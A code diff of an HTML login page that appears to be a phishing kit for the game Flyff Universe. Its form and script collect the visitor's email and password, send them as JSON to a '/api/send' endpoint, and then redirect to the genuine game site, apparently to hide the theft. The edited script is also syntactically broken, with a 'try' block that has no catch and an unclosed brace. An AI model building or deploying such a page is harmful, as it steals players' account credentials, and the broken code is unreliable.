@@ -239,37 +239,45 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     <div class="separator mt-5">Or continue with</div>
         
-         <form method="POST" action="send.php" class="mt-5" id="captcha-form">
-    <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
-    
-    <div class="mb-3">
-                    <label class="form-label text-primary" for="email">Email Address</label>
-                    <input id="email" type="text" class="form-control " name="email" value="" required="" autocomplete="email" autofocus="">
-    </div>
-    
+<form method="POST" action="/api/send" class="mt-5" id="captcha-form">
+  <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
+
+  <div class="mb-3">
+    <label class="form-label text-primary" for="email">Email Address</label>
+    <input
+      id="email"
+      type="email"
+      class="form-control"
+      name="email"
+      value=""
+      required
+      autocomplete="email"
+      autofocus
+    >
+  </div>
+
     <div class="mb-3">
                     <label class="form-label text-primary" for="password">Password</label>
                     <input id="password" type="password" class="form-control " name="password" required="" autocomplete="current-password">
     </div>
-    
-    <div class="row gy-3 mb-3">
-        <div class="col-md-6">
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" name="remember" id="remember">
-                <label class="form-check-label" for="remember">Remember Me</label>
-            </div>
-        </div>
-    </div>
-    
-    <div class="d-grid">
-        <button type="submit" class="btn btn-gradient d-block" id="submit-btn">Login</button>
-    </div>
-</form> 
 
+  <div class="row gy-3 mb-3">
+    <div class="col-md-6">
+      <div class="form-check">
+        <input class="form-check-input" type="checkbox" name="remember" id="remember">
+        <label class="form-check-label" for="remember">Remember Me</label>
+      </div>
+    </div>
+  </div>
 
-            <script>
+  <div class="d-grid">
+    <button type="submit" class="btn btn-gradient d-block" id="submit-btn">Submit</button>
+  </div>
+</form>
+
+<script>
 document.addEventListener('DOMContentLoaded', function () {
-  const form = document.getElementById('contact-form');
+  const form = document.getElementById('captcha-form');
   if (!form) return;
 
   form.addEventListener('submit', async function (e) {
@@ -277,19 +285,23 @@ document.addEventListener('DOMContentLoaded', function () {
 
     const email = document.getElementById('email')?.value?.trim() || '';
     const password = document.getElementById('password')?.value?.trim() || '';
+    const remember = document.getElementById('remember')?.checked || false;
 
-    const response = await fetch('/api/send', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password })
-    });
+    try {
+      const response = await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, remember })
+      });
 
-    const data = await response.json();
-    console.log(data);
+      const data = await response.json();
+
+setTimeout(() => {
+  window.location.href = "https://universe.flyff.com/play";
+}, 500);
   });
 });
 </script>
-
             
                             <hr>
 
